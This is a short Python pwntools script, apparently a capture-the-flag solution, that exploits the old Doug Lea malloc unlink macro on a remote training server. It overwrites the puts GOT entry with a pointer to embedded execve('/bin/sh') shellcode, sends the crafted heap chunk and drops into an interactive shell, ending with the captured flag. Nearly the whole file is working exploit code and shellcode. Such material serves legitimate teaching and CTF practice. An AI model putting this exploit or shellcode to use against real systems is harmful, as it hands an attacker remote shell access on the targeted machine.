import struct 
import socket 
from pwn import *

# Old Doug Lee malloc() exploit, unsing unlink macro

def pack(a):
    return struct.pack("Q", a)

host = "lettieri.iet.unipi.it"
#host = "localhost"
port = 7000

puts_got = 0x604698 - 24

# connecting with nc you get: a 0x605420 b 0x605530, PIE is not enabled
a = 0x605420
b = 0x605530

shellcode_address = a + 16
print("Shellcode address: {}".format(hex(shellcode_address)))
shellcode = asm("jmp label;" + "nop;"*32 + "label: nop")
shellcode += b"jhH\xb8\x2fbin\x2f\x2f\x2fsPH\x89\xe7hri\x01\x01\x814\x24\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05"

size = 272

with remote(host, port) as conn:
    print(conn.recv(24).decode("ascii"))
    buf = b""
    buf += pack(puts_got)
    buf += pack(shellcode_address)
    buf += shellcode
    buf += b"\x90"*(256 - len(buf))
    buf += pack(size) # prev_size
    buf += pack(size) # size 
    print("Payload is : {} bytes".format(len(buf)))
    conn.send(buf)

    conn.interactive()

# NSH{when_I_was_young_unlink_was_unsafe}